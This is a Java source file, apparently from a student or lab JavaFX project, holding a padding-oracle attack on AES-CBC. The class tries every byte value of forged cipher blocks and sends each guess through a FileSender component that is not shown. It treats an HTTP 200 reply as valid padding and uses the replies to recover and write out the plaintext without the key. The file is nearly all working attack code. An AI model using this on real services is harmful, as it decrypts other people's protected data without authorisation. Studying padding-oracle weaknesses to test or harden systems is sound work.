package com.evgeniy_mh.paddingoracle;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.FutureTask;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.concurrent.Task;
import javafx.scene.control.ProgressIndicator;

public class AES_CBCBruteforcer {

    final static int AES_BLOCK_SIZE = 16;
    final private ProgressIndicator progressIndicator;

    public AES_CBCBruteforcer(ProgressIndicator progressIndicator) {
        this.progressIndicator = progressIndicator;
    }

    public Task<Void> Bruteforce(File in, File out) {
        return new Task<Void>() {
            @Override
            protected Void call() throws Exception {

                ArrayList<byte[]> paddings = new ArrayList<>();
                for (int i = 1; i <= AES_BLOCK_SIZE; i++) {
                    byte[] p = new byte[i];
                    for (int j = 0; j < i; j++) {
                        p[j] = (byte) i;
                    }
                    paddings.add(p);
                }

                byte[] bytes = Files.readAllBytes(in.toPath());

                int blocksCount = bytes.length / AES_BLOCK_SIZE;
                ArrayList<byte[]> fileBlocks = new ArrayList<>();
                for (int i = 0; i < blocksCount; i++) {
                    byte[] buff = new byte[AES_BLOCK_SIZE];
                    System.arraycopy(bytes, i * 16, buff, 0, 16);
                    fileBlocks.add(buff);
                }

                int resultProgress = (blocksCount - 1) * AES_BLOCK_SIZE * 256;
                int progress = 0;

                FileOutputStream fos = new FileOutputStream(out, true);
                for (int i = 1; i < blocksCount; i++) {
                    byte[] I2 = new byte[AES_BLOCK_SIZE];
                    int I2cnt = AES_BLOCK_SIZE - 1;

                    for (int b = 0; b < 16; b++) { //по байтам
                        for (int g = 0; g < 256; g++) { //по 1 байту
                            //C1`
                            byte[] C1d = new byte[AES_BLOCK_SIZE];

                            byte[] Pad = paddings.get(b).clone();
                            System.arraycopy(Pad, 0, C1d, AES_BLOCK_SIZE - Pad.length, Pad.length);//C1..|..Pad

                            C1d[AES_BLOCK_SIZE - Pad.length] = (byte) (C1d[AES_BLOCK_SIZE - Pad.length] ^ g);//01^j
                            if (b != 0) {
                                for (int p = 0; p < AES_BLOCK_SIZE; p++) {
                                    C1d[p] = (byte) (C1d[p] ^ I2[p]);
                                }
                            }

                            byte[] tempFile = new byte[AES_BLOCK_SIZE * 2];
                            byte[] C2 = fileBlocks.get(i);

                            System.arraycopy(C1d, 0, tempFile, 0, AES_BLOCK_SIZE);
                            System.arraycopy(C2, 0, tempFile, AES_BLOCK_SIZE, AES_BLOCK_SIZE); //C1` + C2

                            Callable<Integer> callable = new FileSender(tempFile);
                            FutureTask<Integer> ftask = new FutureTask<>(callable);
                            Thread thread = new Thread(ftask);
                            thread.start();

                            int response = 0;
                            try {
                                response = ftask.get();
                            } catch (InterruptedException | ExecutionException ex) {
                                Logger.getLogger(FXMLController.class.getName()).log(Level.SEVERE, null, ex);
                            }

                            if (response == 200) {
                                I2[I2cnt--] = (byte) g;
                                progress += 255 - g;
                                break;
                            }
                            progress++;
                            progressIndicator.setProgress((double) progress / (double) resultProgress);
                        }
                    }

                    byte[] C1 = fileBlocks.get(i - 1).clone();
                    for (int p = 0; p < AES_BLOCK_SIZE; p++) {
                        C1[p] = (byte) (C1[p] ^ I2[p]);
                    }
                    fos.write(C1);
                }
                fos.close();
                return null;
            }
        };
    }
}
